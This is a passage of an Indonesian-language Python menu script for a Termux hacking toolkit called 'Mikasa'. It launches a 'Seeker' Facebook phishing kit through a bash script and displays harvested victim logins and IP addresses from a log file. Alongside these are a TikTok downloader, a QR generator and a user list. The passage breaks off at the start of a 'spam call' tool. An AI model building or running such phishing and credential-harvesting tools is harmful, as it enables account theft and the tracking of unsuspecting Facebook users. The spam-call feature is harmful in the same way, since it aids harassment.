    if pilihan == "5":
        view_logs()
        return
    layanan_map = {
        "1": {"name": "Facebook", "sub": "facebook"},
    }
    if pilihan not in layanan_map:
        print(f"\n{W}[ {R}?{W} ] Pilihan tidak valid!{N}")
        time.sleep(1)
        return
    service = layanan_map[pilihan]
    script_dir = os.path.join(os.path.dirname(__file__), "item")
    main_sh = os.path.join(script_dir, "Main.sh")
    if not os.path.exists(main_sh):
        print(f"\n{W}[ {R}!{W} ] Main.sh tidak ditemukan di {script_dir}{N}")
        print(f"{W}[ {R}!{W} ] Pastikan file Main.sh ada{N}")
        input(f"\n{W}Tekan Enter...{N}")
        return
    os.chmod(main_sh, 0o755)
    print(f"""
{W}╭─────────────────────────────────────────────────────────────╮
{W}│  {W}✔ Layanan  : {G}{service['name']}
{W}│  {W}✔ Status   : {Y}Menjalankan Seeker Phising IP
{W}╰─────────────────────────────────────────────────────────────╯{N}
""")
    process = subprocess.Popen(
        ["bash", main_sh, service['name'], service['sub']],
        cwd=script_dir,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )
    for line in process.stdout:
        print(line, end='')
    process.wait()

    print(f"\n{Y}[!] Kembali ke Mikasa...{N}")
    time.sleep(1)
    return
        
   except KeyboardInterrupt:
        print(f"\n\n{Y}[!] kembali ke Mikasa...{N}")
        time.sleep(1)
        return
   except Exception as e:
        print(f"\n{R}[!] Error: {e}{N}")
        time.sleep(2)
        return
def view_logs():
    script_dir = os.path.join(os.path.dirname(__file__), "item", "Phssing")
    log_file = os.path.join(script_dir, "ip.txt")
    G = '\033[1;32m'
    R = '\033[1;31m'
    Y = '\033[1;33m'
    C = '\033[1;36m'
    W = '\033[1;37m'
    N = '\033[0m'
    try:
        with open(log_file, "r") as f:
            logs = f.read().strip().split('\n')
        if not logs or logs == ['']:
            print(f"\n{Y}⚠ Belum ada aktivitas.{N}")
        else:
            print(f"""
{W}╭─────────────────────────────────────────────────────────────╮
{W}│  {G}📋 LOG AKTIVITAS PHISHING
{W}├─────────────────────────────────────────────────────────────┤{N}
""")
            for log in logs[-20:]:
                if "LOGIN:" in log:
                    print(f"{W}│  {R}🔑 {log[:75]}")
                elif "IP:" in log:
                    print(f"{W}│  {G}🌐 {log[:75]}")
                else:
                    print(f"{W}│  {Y}{log[:75]}")
            print(f"{W}├─────────────────────────────────────────────────────────────┤{N}")
            print(f"{W}│  {G}Total: {len(logs)} entri")
            print(f"{W}╰─────────────────────────────────────────────────────────────╯{N}")
    except FileNotFoundError:
        print(f"\n{Y}⚠ Belum ada log.{N}")
    input(f"\n{W}Tekan Enter...{N}")
    
def tool_tiktok_downloader():
 os.system('clear')
 G = '\033[1;32m'
 R = '\033[1;31m'
 Y = '\033[1;33m'
 B = '\033[1;34m'
 C = '\033[1;36m'
 P = '\033[1;35m'
 W = '\033[1;37m'
 N = '\033[0m'


 COLORS = ['\x1b[1;91m', '\x1b[1;93m', '\x1b[1;92m', '\x1b[1;94m']
 RESET = '\x1b[0m'

 def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

 def loading_bar_anim(stop_event, text="Memproses"):
    length = 20
    color_index = 0
    i = 0
    while not stop_event.is_set():
        filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
        empty = '□' * (length - i)
        sys.stdout.write(f'\r{W}[{filled_color}{empty}{W}] {G}{text}{N}')
        sys.stdout.flush()
        i += 1
        if i > length:
            i = 0
            color_index += 1
        time.sleep(0.08)
    sys.stdout.write('\r' + ' ' * 80 + '\r')
    sys.stdout.flush()

 def banner_tiktok():
    play_menu_sound()
    pantau_aktivitas()
    clear_screen()
    banner_Tiktok = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣶⣶⣶⣶⣶⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣤⣤⡄⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠈⠉⠛⠛⠿⠿⠿⠿⠀
⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣼⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢹⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⢿⣿⣿⣿⣿⣿⣿⣷⣤⣀⡀⠀⠀⣀⣠⣶⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    os.system(f'echo "{banner_Tiktok}" | lolcat 2>/dev/null || echo "{banner_Tiktok}"')
    print(f"{W}╭──────────────────────────────────────────────────────────────────╮{N}")
    print(f"{W}│ Author {R}: {W}Rullzzz06{R} | {W}Tools{R}:{W} Tiktok downloader")
    print(f"{W}╰──────────────────────────────────────────────────────────────────╯{N}")
    print()

 def get_download_path():
    paths = [
        "/sdcard/TikTok_downloader",
        "/storage/emulated/0/TikTok_downloader",
        os.path.join(os.path.expanduser("~"), "storage", "TikTok_downloader"),
        os.path.join(os.path.expanduser("~"), "TikTok_downloader"),
    ]
    
    for path in paths:
        try:
            if not os.path.exists(path):
                os.makedirs(path, exist_ok=True)
            test_file = os.path.join(path, ".test")
            with open(test_file, 'w') as f:
                f.write("test")
            os.remove(test_file)
            return path
        except:
            continue
    
    fallback = "/sdcard/TikTok_downloader"
    try:
        os.makedirs(fallback, exist_ok=True)
        return fallback
    except:
        return os.getcwd()

 def download_file(url, filename, tipe):
    try:
        stop_event = threading.Event()
        loading_thread = threading.Thread(target=loading_bar_anim, args=(stop_event, f"Mengunduh {tipe}"))
        loading_thread.daemon = True
        loading_thread.start()
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        response = requests.get(url, headers=headers, stream=True, timeout=60)
        total_size = int(response.headers.get('content-length', 0))
        
        if total_size == 0:
            with open(filename, 'wb') as f:
                f.write(response.content)
            stop_event.set()
            time.sleep(0.2)
            print(f"\n{G}[✓] Berhasil!{N}")
            return True
        
        downloaded = 0
        chunk_size = 8192
        with open(filename, 'wb') as f:
            for chunk in response.iter_content(chunk_size=chunk_size):
                if chunk:
                    f.write(chunk)
                    downloaded += len(chunk)
        
        stop_event.set()
        time.sleep(0.2)
        print(f"\n{G}[✓] Download selesai!{N}")
        return True
        
    except Exception as e:
        stop_event.set()
        print(f"\n{R}[✗] Gagal download: {e}{N}")
        return False

 def get_tiktok_data(url):
    try:
        api_url = f"https://tikwm.com/api/?url={quote(url, safe='')}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        resp = requests.get(api_url, headers=headers, timeout=30)
        data = resp.json()
        
        if data.get('code') == 0:
            return {
                'success': True,
                'video': data.get('data', {}).get('play'),
                'audio': data.get('data', {}).get('music'),
                'title': data.get('data', {}).get('title', 'tiktok')
            }
        return {'success': False}
        
    except Exception as e:
        return {'success': False, 'error': str(e)}

 def download_tiktok():
    download_dir = get_download_path()
    
    while True:
        banner_tiktok()
        
        print(f"{W}╭───────────────────────────────────────────────────────────────────╮{W}")
        print(f"{W}│{W} [ {G}1{W} ] {W}Download Mp4 (Video){W}   ")
        print(f"{W}│{W} [ {G}2{W} ] {W}Download Mp3 (Audio){W}   ")
        print(f"{W}│{W} [ {G}0{W} ] {W}Kembali{W}               ")
        print(f"{W}╰───────────────────────────────────────────────────────────────────╯{W}")
        pilihan = input(f"{U}❯❯❯{W} Pilih Menu {R}❯ {N}").strip()
        
        if pilihan == "0":
            print(f"{W}[ {R}!{W} ] Kembali...{N}")
            break
        
        if pilihan not in ["1", "2"]:
            print(f"{W}[ {R}??{W} ] Pilihan tidak valid!{N}")
            time.sleep(1)
            continue
        
        tipe_text = "Video (MP4)" if pilihan == "1" else "Audio (MP3)"
        ext = "mp4" if pilihan == "1" else "mp3"
        
        print(f"\n{W}╭──────────────────────────────────────────────────────────────────╮{W}")
        print(f"{W}│{W} Type    : {G}{tipe_text}{W}            ")
        print(f"{W}╰──────────────────────────────────────────────────────────────────────╯{W}")
        url = input(f"{U}❯❯❯{W} Masukkan Link Video Tiktok {G}❯ {N}").strip()
        
        if not url:
            print(f"\n{W}[ {R}??{W} ] URL tidak boleh kosong!{N}")
            time.sleep(1)
            continue
        
        stop_event = threading.Event()
        loading_thread = threading.Thread(target=loading_bar_anim, args=(stop_event, "Mendapatkan data"))
        loading_thread.daemon = True
        loading_thread.start()
        
        result = get_tiktok_data(url)
        stop_event.set()
        time.sleep(0.2)
        
        if result.get('success'):
            if pilihan == "1":
                video_url = result.get('video')
                if video_url:
                    print(f"\n{G}[✓] Video ditemukan!{N}")
                    title = result.get('title', 'tiktok')[:50]
                    title = "".join(c for c in title if c.isalnum() or c in " ._-")
                    if not title.strip():
                        title = "tiktok_video"
                    filename = f"{title}_{int(time.time())}.{ext}"
                    filepath = os.path.join(download_dir, filename)
                    print(f"{W}    Nama: {G}{filename}{N}")
                    if download_file(video_url, filepath, "Video"):
                        print(f"{Y}    📁 File tersimpan di TikTok_downloader{N}")
                else:
                    print(f"\n{W}[ {R}??{W} ] Gagal mendapatkan link video{N}")
            elif pilihan == "2":
                audio_url = result.get('audio')
                if audio_url:
                    print(f"\n{G}[✓] Audio ditemukan!{N}")
                    title = result.get('title', 'tiktok')[:50]
                    title = "".join(c for c in title if c.isalnum() or c in " ._-")
                    if not title.strip():
                        title = "tiktok_audio"
                    filename = f"{title}_{int(time.time())}.{ext}"
                    filepath = os.path.join(download_dir, filename)
                    print(f"{W}    Nama: {G}{filename}{N}")
                    if download_file(audio_url, filepath, "Audio"):
                        print(f"{Y}    📁 File tersimpan di TikTok_downloader{N}")
                else:
                    print(f"\n{W}[ {R}??{W} ] Gagal mendapatkan link audio{N}")
        else:
            error = result.get('error', 'Terjadi kesalahan')
            print(f"\n{R}[✗] Gagal: {error}{N}")
            print(f"{W}[ {R}!{W} ] Coba link lain atau cek koneksi{N}")
        
        print("\n" + "=" * 60)
        input(f"\n{W}[ {R}!{W} ] Tekan Enter untuk lanjut...{N}")


 if __name__ == "__main__":
    try:
        download_tiktok()
    except KeyboardInterrupt:
        print(f"\n{W}[ {R}!{W} ] Keluar...{N}")
        sys.exit(0)

def tool_JOIN_Grub():
    import webbrowser
    link_grup = "https://chat.whatsapp.com/E7jQq8RC3lIHVl0FFU2ovh?s=sh&p=a&mlu=2"
    os.system('clear')
    print(f"[ {G}✦{W} ] Selamat {G}datang{W} Di {G}Grup{W} Mikasa!{N}")
    subprocess.run(["termux-open-url", link_grup])

def tool_qr_generator():
    play_menu_sound()
    os.system('clear')
    
    ascii_qr = """
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣾⣿⡆⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⣿⣿⠀⠀⣾⣿⣿⣿⣿⣿⡇⠀⢰⣿⣷⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⣿⣿⡏⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣿⣿⠀⠀⣿⣿⣷⣶⣾⣿⣿⣿⡇⠀⠀⠀⠀⣿⣿⣶⣶⡏⠉⢹⣿⡏⠉⢱⣶⣾⠉⠉⠀⠀⣿⣿⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⢹⣿⣿⠀
⣿⣿⡇⠀⢰⣶⣶⣶⣶⣶⣶⠀⠀⣿⣿⠀⠀⣿⣿⡏⠉⠉⠉⢹⣿⣿⣶⣶⠀⠀⠉⠉⠉⠉⣷⣶⡎⠉⢱⣶⣾⣿⣿⣶⣶⠀⠀⣿⣿⠀⠀⣶⣶⣶⣶⣶⣶⡆⠀⢸⣿⣿⠀
⣿⣿⡇⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⠀⠀⠉⠉⠁⠀⢰⣶⣾⣿⡟⠉⠉⣶⣶⣶⣶⠀⠀⣿⣿⣷⣶⡎⠉⢹⣿⣿⠉⠉⠀⠀⣿⣿⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⣿⠀
⣿⣿⡇⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⠀⠀⠀⠀⢰⣶⣾⣿⣿⣿⣷⣶⣶⠛⠛⠛⠛⠀⠀⣿⣿⡟⠛⢳⣶⣾⣿⣿⠀⠀⠀⠀⣿⣿⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⣿⠀
⣿⣿⡇⠀⠘⠛⠛⠛⠛⠛⠛⠀⠀⣿⣿⠀⠀⣤⣤⣾⣿⣿⣿⡟⠛⢻⣿⣿⠀⠀⠀⠀⣤⣤⣿⣿⡇⠀⢸⣿⡟⠛⠋⠀⠀⠀⠀⣿⣿⠀⠀⠛⠛⠛⠛⠛⠛⠃⠀⢸⣿⣿⠀
⣿⣿⣧⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣿⣿⠀⠀⣿⣿⡟⠛⢻⣿⡇⠀⢸⣿⣿⠀⠀⣤⣤⠛⠛⣿⣿⡇⠀⢸⣿⡇⠀⢠⣤⣤⠀⠀⣿⣿⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣼⣿⣿⠀
⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠀⠀⣿⣿⡇⠀⢸⣿⣧⣤⣼⣿⣿⣤⣤⣿⣿⣤⣤⣿⣿⡇⠀⠘⠛⢣⣤⣼⠛⠛⠀⠀⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠀
⠀⠀⠀⠀⢀⣤⣤⣤⣤⣤⣄⠀⠀⣠⣤⠀⠀⣿⣿⡇⠀⢸⣿⡿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⡿⠿⠃⠀⢀⣤⡼⠿⠟⠀⠀⣤⣤⣤⣤⣤⣤⠀⠀⠀⠀⢀⣤⣤⣤⣤⣤⣄⠀
⠀⠀⠀⠀⢸⣿⡿⠿⠿⠿⠿⠀⠀⠿⠿⠀⠀⣿⣿⣇⣀⣸⣿⡇⠀⢀⣀⣠⠿⠿⠿⠿⠿⠿⠃⠀⢀⣀⡼⠿⠇⠀⠀⠀⠀⠿⠿⣿⣿⣿⣿⣄⣀⣀⣀⣼⣿⡿⠿⢿⣿⣿⠀
⠀⠀⢀⣀⡸⠿⠇⠀⢀⣀⣀⣀⣀⣀⣀⠀⠀⣿⣿⡿⠿⢿⣿⣇⣀⡸⠿⠿⣀⣀⣀⣀⣀⣀⣀⣀⡸⠿⠇⠀⠀⠀⠀⠀⠀⣀⣀⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⡇⠀⠸⠿⠿⠀
⠀⠀⠸⠿⢇⣀⣀⣀⣸⠿⠿⠿⠿⠿⠿⣀⣀⣿⣿⣇⣀⣸⣿⣿⠿⢇⣀⣀⠿⠿⠿⠿⣿⣿⣿⣿⣇⣀⡀⠀⢀⣀⡀⠀⠀⣿⣿⣿⣿⠀⠀⣀⣀⣸⣿⡿⠿⢇⣀⡀⠀⠀⠀
⠀⠀⢀⣀⣸⣿⣿⣿⣿⣀⣀⣀⣀⣀⣀⡿⠿⣿⣿⡿⠿⠿⠿⢇⣀⣸⠿⢿⣀⣀⣀⣀⡿⠿⣿⣿⡿⠿⠇⠀⢸⣿⣿⣀⣀⣿⣿⠿⠿⣀⣀⡿⠿⣿⣿⣇⣀⣸⣿⣇⣀⡀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⣿⣿⡇⠀⠀⠀⢸⣿⣇⠀⢀⣿⣿⣿⣿⠀⠀⣿⣿⡇⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⡀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⠀
⣿⣿⡇⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⡇⠀⠀⠀⢸⣿⡇⠀⢸⣿⣿⠀⠀⠀⠀⣿⣿⠇⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⡇⠀⢸⣿⣿⣿⣿⠀
⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⢸⣿⣿⣿⣿⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⡏⠀⠀⠀
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⣿⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⣿⣿⠀⠀⠀⠀⣿⣿⣿⣿⡇⠀⠀⠀⢸⣿⣿⠀
⠈⠉⢹⣿⣿⣿⡇⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠉⠉⣿⣿⣿⣿⠉⠉⣿⣿⡆⠀⢸⣿⡇⠀⢰⣿⣿⠉⠉⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⣿⠀
⣶⣶⡎⠉⢹⣿⡇⠀⢰⣶⣶⠉⠉⠉⠉⣿⣿⡏⠉⠉⠉⠉⠉⢹⣿⣿⣶⣾⠉⠉⣿⣿⠀⠀⣿⣿⡇⠀⢸⣿⡇⠀⢸⣿⣿⠀⠀⠀⠀⣶⣶⣿⣿⡏⠉⠉⠉⢱⣶⣾⣿⣿⠀
⣿⣿⡇⠀⠈⠉⠁⠀⢸⣿⣿⣶⣶⣶⣶⠉⠉⠀⠀⢰⣶⡆⠀⠈⠉⠉⠉⠉⣶⣶⠉⠉⠀⠀⠉⠉⠁⠀⢸⣿⡇⠀⢸⣿⣿⠀⠀⣶⣶⠉⠉⠉⠉⠁⠀⢰⣶⡎⠉⠉⠉⠉⠀
⣿⣿⡇⠀⢰⣶⡆⠀⢸⣿⣿⠉⠉⠉⠉⣶⣶⡆⠀⠈⠉⢱⣶⣶⣶⡆⠀⠀⣿⣿⣶⣶⣶⣶⡄⠀⠀⠀⠈⠉⠁⠀⠈⠉⠉⠀⠀⣿⣿⣶⣶⣶⣶⡆⠀⠈⠉⢱⣶⣶⣶⣶⠀
⣿⣿⡇⠀⠈⠛⢳⣶⣾⠛⠛⣶⣶⣶⣶⠛⠛⣷⣶⡄⠀⠘⠛⢻⣿⣷⣶⣶⠛⠛⣿⣿⠛⠛⣷⣶⡄⠀⠀⠀⠀⠀⢠⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⡇⠀⢰⣶⡞⠛⠛⠛⠋⠀
⠙⠛⠃⠀⠀⠀⠈⠛⠋⠀⠀⠛⠛⠛⠛⠀⠀⣿⣿⡇⠀⢠⣤⣾⣿⣿⣿⣿⣤⣴⣿⣿⣦⣤⡟⠛⢳⣤⣤⣤⣤⣤⣼⣿⣿⠛⠛⠛⠛⠛⠛⣿⣿⣧⣤⡞⠛⢳⣤⣤⣤⣤⠀
⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⠀⠀⠙⠛⢣⣤⣼⣿⣿⣿⡟⠛⠛⣿⣿⣿⣿⣿⣿⡇⠀⠘⠛⠛⠛⢻⣿⣿⣿⣿⠀⠀⣤⣤⠀⠀⣿⣿⡟⠛⠃⠀⠘⠛⠛⠛⠛⠀
⣿⣿⡟⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣿⣿⠀⠀⠀⠀⢸⣿⡟⠛⠛⠛⠃⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⢠⣤⣤⣤⣼⣿⣿⣿⣿⠀⠀⠛⠛⠀⠀⣿⣿⣧⣤⡄⠀⠀⠀⠀⠀⠀⠀
⣿⣿⡇⠀⢠⣤⣤⣤⣤⣤⣤⠀⠀⣿⣿⠀⠀⣠⣤⣼⣿⡇⠀⠀⠀⠀⠀⠀⠛⠛⣿⣿⣿⣿⣧⣤⡜⠛⢿⣿⡿⠛⢻⣿⣿⣤⣤⣤⣤⣤⣤⣿⣿⣿⣿⣧⣤⣤⣤⣤⣤⣄⠀
⣿⣿⡇⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⠀⠀⣿⣿⣿⣿⣇⣀⡀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡿⠿⠇⠀⢸⣿⣧⣀⣸⣿⣿⣿⣿⠿⠿⣿⣿⠿⠿⢿⣿⣿⣿⡿⠿⠿⠿⠟⠀
⣿⣿⡇⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⠀⠀⣿⣿⣿⣿⡿⠿⢇⣀⡀⠀⠀⠀⠀⣿⣿⣿⣿⣇⣀⡀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣀⣀⣿⣿⣄⣀⣼⣿⣿⣿⣇⣀⡀⠀⠀⠀
⣿⣿⡇⠀⠸⠿⠿⠿⠿⠿⠿⠀⠀⣿⣿⠀⠀⠻⠿⠿⠿⢇⣀⡸⠿⠇⠀⠀⣀⣀⣿⣿⣿⣿⣿⣿⡇⠀⠸⠿⢿⣿⣿⠿⢿⣿⣿⠿⠿⠿⠿⣿⣿⡿⠿⠿⠿⢿⣿⡇⠀⠀⠀
⣿⣿⣇⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠿⠿⠿⠿⠿⠿⣿⣿⣇⣀⡀⠀⢸⣿⣿⠀⠀⣿⣿⣀⣀⠀⠀⣿⣿⣇⣀⣀⣀⡸⠿⠇⠀⠀⠀
⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⡇⠀⢸⣿⡿⠀⠀⣿⣿⣿⣿⠀⠀⢿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
"""
    os.system(f'echo "{ascii_qr}" | lolcat')
    print(f"""
{W}╭─────────────────────────────────────────────────────────────╮
{W}│ [ {G}✦{W} ]  QR CODE GENERATOR{W}
{W}│ [ {G}✦{W} ]  Ubah Teks / Link Menjadi QR Code{W}
{W}╰─────────────────────────────────────────────────────────────╯{N}""")
    print(f"{W}╭─────────────────────────────────────────────────────────────╮")
    print(f"{W}│{W}  Masukkan Teks / Link yang mau dijadikan QR Code{N}")
    print(f"{W}│{G}  Contoh: https://wa.me/628xxx atau teks bebas{N}")
    print(f"{W}╰─────────────────────────────────────────────────────────────╯")
    
    teks = input(f"{U}❯❯❯{W} Masukkan Teks {R}/{W} link{G}❯{W} ").strip()
    
    if not teks:
        print(f"\n{R}✗ Teks tidak boleh kosong!{N}")
        input(f"\n{W}Tekan Enter untuk kembali...{N}")
        return
    
    save_dir = "/sdcard/QR_HASIL"
    if not os.path.exists(save_dir):
        try:
            os.makedirs(save_dir, exist_ok=True)
        except:
            save_dir = os.path.join(os.path.expanduser("~"), "storage", "downloads", "QR_HASIL")
            os.makedirs(save_dir, exist_ok=True)
    
    timestamp = int(time.time())
    filename = f"qr_{timestamp}.png"
    filepath = os.path.join(save_dir, filename)
    
    encoded = quote(teks)
    url = f"https://api.qrserver.com/v1/create-qr-code/?size=500x500&data={encoded}"
    
    print(f"\n{G}▶ Teks    : {W}{teks}")
    print(f"{G}▶ Lokasi  : {W}{filepath}{N}")
    print()
    
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    for i in range(20):
        sys.stdout.write(f"\r{W}[[ {G}Membuat QR Code... {W} ]] {Y}{chars[i % len(chars)]}{W}")
        sys.stdout.flush()
        time.sleep(0.08)
    
    try:
        resp = requests.get(url, timeout=15)
        with open(filepath, 'wb') as f:
            f.write(resp.content)
        
        print(f"\n\n{G}✅ QR Code berhasil dibuat!{N}")
        print(f"{W}📁 Lokasi: {G}{filepath}{N}")
        print(f"{W}📱 Buka di Galeri / File Manager → QR_HASIL{N}")
        
    except Exception as e:
        print(f"\n\n{R}✗ Gagal: {e}{N}")
    
    input(f"\n{W}╰──{G}❯{W}Tekan {R}Enter{W} untuk kembali...{W} ")

def tool_list_user():
    os.system('clear')
    
    print(f"""
{W}╭─────────────────────────────────────────────────────────────╮
{W}│ Menampilkan {G}Jumlah{W} Pengguna
{W}╰─────────────────────────────────────────────────────────────╯
""")
    
    try:
        resp = requests.get(REPO_UID, timeout=10)
        if resp.status_code == 200:
            lines = resp.text.strip().splitlines()
            total = 0
            user_list = []
            
            for line in lines:
                line = line.strip()
                if line and not line.startswith('#'):
                    parts = line.split('|')
                    if len(parts) >= 3:
                        total += 1
                        nama = parts[1].strip()
                        user_list.append(nama)
            
            for i, nama in enumerate(user_list, 1):
                print(f"{W}{i}. {G}{nama}{N}")
            
            print()
            print(f"{W}╭─────────────────────────────────────────────────────────────╮{N}")
            print(f"{W}│ [ {G}✦{W} ] Total User: {G}{total}{W}{N}")
            print(f"{W}╰─────────────────────────────────────────────────────────────╯{N}")
            
        else:
            print(f"{R} Gagal terhubung ke server!{N}")
            
    except Exception as e:
        print(f"{R} Error: {e}{N}")
    
    print()
    input(f"{W}Tekan Enter untuk kembali...{N}")
def tool_spam_call():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, random, string, requests, json, threading
    
    os.system('clear')
    
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    W = '\033[97m'
    C = '\033[96m'
    N = '\033[0m'
    
    ascii_call = """
